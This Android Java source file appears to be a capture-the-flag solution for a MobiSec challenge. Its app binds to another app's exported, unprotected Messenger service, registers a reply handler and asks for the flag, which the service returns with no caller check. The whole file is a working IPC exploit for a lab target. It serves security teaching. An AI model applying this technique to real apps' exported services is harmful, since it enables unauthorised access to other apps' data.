package org.naija.binder;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.util.Log;
import android.widget.TextView;

/**
 * Challenge 05: Unbindable Service.
 *
 * Exploit: com.mobisec.unbindable.UnbindableService is bindable by any app
 * (exported Service, no permission requirement) and speaks a simple
 * Messenger protocol. We register our own reply Messenger with
 * MSG_REGISTER_CLIENT, then send MSG_GET_FLAG - the service replies with a
 * Bundle containing the flag directly, no authentication or signature check
 * on the caller at all.
 */
public class MainActivity extends Activity {
    private static final String TAG = "MOBISEC";
    private static final int MSG_REGISTER_CLIENT = 1;
    private static final int MSG_GET_FLAG = 4;

    private TextView tv;
    private boolean bound = false;

    private final Messenger replyMessenger = new Messenger(new Handler() {
        @Override
        public void handleMessage(Message msg) {
            if (msg.what == MSG_GET_FLAG && msg.obj instanceof Bundle) {
                String flag = ((Bundle) msg.obj).getString("flag");
                Log.e(TAG, "FLAG: " + flag);
                tv.setText(String.valueOf(flag));
            }
        }
    });

    private final ServiceConnection conn = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Messenger server = new Messenger(service);
            try {
                Message reg = Message.obtain(null, MSG_REGISTER_CLIENT);
                reg.replyTo = replyMessenger;
                server.send(reg);

                Message get = Message.obtain(null, MSG_GET_FLAG);
                get.replyTo = replyMessenger;
                server.send(get);
            } catch (Exception e) {
                Log.e(TAG, "send failed", e);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        tv = new TextView(this);
        tv.setText("waiting for flag...");
        setContentView(tv);

        Intent i = new Intent();
        i.setComponent(new ComponentName("com.mobisec.unbindable",
                "com.mobisec.unbindable.UnbindableService"));
        bound = bindService(i, conn, Context.BIND_AUTO_CREATE);
        Log.e(TAG, "bindService returned " + bound);
    }

    @Override
    protected void onDestroy() {
        if (bound) unbindService(conn);
        super.onDestroy();
    }
}
